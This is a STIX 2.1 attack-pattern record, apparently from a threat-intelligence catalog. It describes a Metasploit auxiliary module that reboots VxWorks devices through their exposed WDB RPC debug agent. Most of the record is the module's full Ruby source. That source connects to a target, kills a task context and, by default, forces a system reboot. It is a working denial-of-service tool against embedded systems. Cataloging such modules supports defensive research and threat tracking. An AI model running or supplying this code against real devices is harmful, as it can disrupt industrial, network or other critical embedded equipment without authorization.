{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--24c6741b-718b-4d22-aa3e-6482d0b46e21",
    "created": "2024-08-14T16:22:34.944371Z",
    "modified": "2024-08-14T16:22:34.944375Z",
    "name": "VxWorks WDB Agent Remote Reboot",
    "description": " This module provides the ability to reboot a VxWorks target through WDBRPC ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/vxworks/wdbrpc_reboot.rb",
            "external_id": "wdbrpc_reboot.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2010/08/02/new-vxworks-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::WDBRPC_Client\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VxWorks WDB Agent Remote Reboot',\n      'Description'    => %q{\n        This module provides the ability to reboot a VxWorks target through WDBRPC\n      },\n      'Author'         => [ 'hdm'],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '66842'],\n          ['URL', 'https://www.rapid7.com/blog/post/2010/08/02/new-vxworks-vulnerabilities/'],\n          ['US-CERT-VU', '362332']\n        ],\n      'Actions'     =>\n        [\n          ['Reboot', 'Description' => 'Reboot target']\n        ],\n      'DefaultAction' => 'Reboot'\n      ))\n\n    register_options(\n      [\n        OptInt.new('CONTEXT', [ true, \"The context to terminate (0=system reboot)\", 0 ])\n      ])\n  end\n\n  def run_host(ip)\n\n    wdbrpc_client_connect\n\n    membase = @wdbrpc_info[:rt_membase]\n    memsize = @wdbrpc_info[:rt_memsize]\n    mtu     = @wdbrpc_info[:agent_mtu]\n    ctx     = datastore['CONTEXT'].to_i\n\n    print_status(\"#{ip} - Killing task context #{ctx}...\")\n\n    wdbrpc_client_context_kill( (ctx != 0) ? 3 : 0, ctx )\n\n    print_status(\"#{ip} - Done\")\n\n    wdbrpc_client_disconnect\n  end\nend\n"
}